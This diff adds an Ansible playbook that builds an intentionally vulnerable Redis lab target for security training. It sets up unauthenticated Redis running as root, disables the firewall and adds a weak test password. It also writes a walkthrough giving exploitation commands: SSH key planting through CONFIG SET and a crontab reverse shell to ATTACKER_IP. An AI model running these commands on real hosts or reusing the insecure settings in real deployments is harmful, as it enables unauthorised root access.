@@ -1,0 +1,210 @@
+---
+- name: Deploy Redis Unauthorized Access Lab
+  hosts: redis_vm
+  become: yes
+
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Install Redis server
+      apt:
+        name: redis-server
+        state: present
+
+    - name: Configure Redis - listen on all interfaces
+      lineinfile:
+        path: /etc/redis/redis.conf
+        regexp: '^bind '
+        line: 'bind 0.0.0.0'
+
+    - name: Configure Redis - disable protected mode
+      lineinfile:
+        path: /etc/redis/redis.conf
+        regexp: '^protected-mode '
+        line: 'protected-mode no'
+
+    - name: Configure Redis - remove requirepass if present
+      lineinfile:
+        path: /etc/redis/redis.conf
+        regexp: '^requirepass '
+        state: absent
+
+    - name: Configure Redis - ensure CONFIG command is not renamed/disabled
+      lineinfile:
+        path: /etc/redis/redis.conf
+        regexp: '^rename-command CONFIG'
+        state: absent
+
+    - name: Configure Redis - allow runtime modification of protected configs (Redis 7.x)
+      lineinfile:
+        path: /etc/redis/redis.conf
+        regexp: '^enable-protected-configs'
+        line: 'enable-protected-configs yes'
+
+    - name: Replace Redis systemd service to run as root without sandbox restrictions
+      copy:
+        dest: /etc/systemd/system/redis-server.service
+        content: |
+          [Unit]
+          Description=Redis Lab Target (runs as root, no sandbox)
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart=/usr/bin/redis-server /etc/redis/redis.conf --daemonize no
+          ExecStop=/bin/kill -s TERM $MAINPID
+          TimeoutStartSec=30
+          Restart=on-failure
+          User=root
+          Group=root
+          RuntimeDirectory=redis
+          RuntimeDirectoryMode=0755
+
+          [Install]
+          WantedBy=multi-user.target
+        mode: '0644'
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and restart Redis
+      systemd:
+        name: redis-server
+        state: restarted
+        enabled: yes
+
+    - name: Wait for Redis to start
+      wait_for:
+        port: 6379
+        delay: 3
+        timeout: 30
+
+    - name: Ensure /root/.ssh directory exists with correct permissions
+      file:
+        path: /root/.ssh
+        state: directory
+        mode: '0700'
+        owner: root
+        group: root
+
+    - name: Create test user account
+      shell: |
+        if ! id redisuser >/dev/null 2>&1; then
+          useradd -m -s /bin/bash redisuser
+        fi
+        echo 'redisuser:redis123' | chpasswd
+      args:
+        executable: /bin/bash
+
+    - name: Disable firewall
+      ufw:
+        state: disabled
+
+    - name: Get target IP address
+      set_fact:
+        target_ip: "{{ ansible_default_ipv4.address }}"
+
+    - name: Create info file
+      copy:
+        dest: /root/TARGET_INFO.txt
+        content: |
+          ===================================================
+          REDIS UNAUTHORIZED ACCESS LAB
+          ===================================================
+
+          Service: Redis (No Authentication)
+          Vulnerability: Unauth RCE via CONFIG command abuse
+          CVE: No CVE (misconfiguration-based attack)
+          Port: 6379
+
+          ===================================================
+          DETECTION & ENUMERATION
+          ===================================================
+
+          # Nmap scan to find Redis
+          nmap -sV -p 6379 {{ target_ip }}
+
+          # Check if Redis is accessible without auth
+          redis-cli -h {{ target_ip }} ping
+          redis-cli -h {{ target_ip }} info server
+          redis-cli -h {{ target_ip }} info keyspace
+
+          ===================================================
+          EXPLOITATION METHOD 1 - Write SSH Public Key (Root Shell)
+          ===================================================
+
+          # Step 1: Generate SSH key pair on attacker machine
+          ssh-keygen -t rsa -f /tmp/redis_key -N ""
+
+          # Step 2: Pad the public key with newlines to survive RDB encoding
+          (echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/pubkey.txt
+
+          # Step 3: Write the key into Redis as a value
+          redis-cli -h {{ target_ip }} flushall
+          redis-cli -h {{ target_ip }} -x set pwned < /tmp/pubkey.txt
+
+          # Step 4: Redirect Redis DB save location to /root/.ssh
+          redis-cli -h {{ target_ip }} config set dir /root/.ssh
+          redis-cli -h {{ target_ip }} config set dbfilename authorized_keys
+          redis-cli -h {{ target_ip }} save
+
+          # Step 5: SSH in as root (no password needed)
+          ssh -i /tmp/redis_key -o StrictHostKeyChecking=no root@{{ target_ip }}
+
+          ===================================================
+          EXPLOITATION METHOD 2 - Write Crontab (Reverse Shell)
+          ===================================================
+
+          # Replace ATTACKER_IP with your machine's IP
+          redis-cli -h {{ target_ip }} config set dir /var/spool/cron/crontabs
+          redis-cli -h {{ target_ip }} config set dbfilename root
+          redis-cli -h {{ target_ip }} set cron $'\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n'
+          redis-cli -h {{ target_ip }} save
+
+          # Listen on attacker machine:
+          nc -lvnp 4444
+
+          ===================================================
+          ATTACK CHAIN SUMMARY
+          ===================================================
+
+          1. Discovery:  Port scan finds Redis on 6379
+          2. Verify:     redis-cli PING returns PONG (no auth)
+          3. Enumerate:  INFO command reveals server details
+          4. Abuse CONFIG: Change dir/dbfilename to arbitrary paths
+          5. Write Files: Plant SSH key or crontab as root
+          6. Root Access: SSH in or catch reverse shell
+
+          ===================================================
+          CREDENTIALS
+          ===================================================
+
+          SSH User: redisuser
+          Password: redis123
+
+          ===================================================
+        mode: '0644'
+
+    - name: Display completion message
+      debug:
+        msg:
+          - "========================================================="
+          - "Redis Unauthorized Access Lab deployed successfully!"
+          - "========================================================="
+          - "Target IP:   {{ target_ip }}"
+          - "Redis Port:  6379 (no authentication)"
+          - ""
+          - "Quick verify:"
+          - "  redis-cli -h {{ target_ip }} ping"
+          - "  Expected: PONG"
+          - ""
+          - "SSH access:"
+          - "  ssh redisuser@{{ target_ip }}"
+          - "  Password: redis123"
+          - ""
+          - "Info file: /root/TARGET_INFO.txt"
+          - "========================================================="
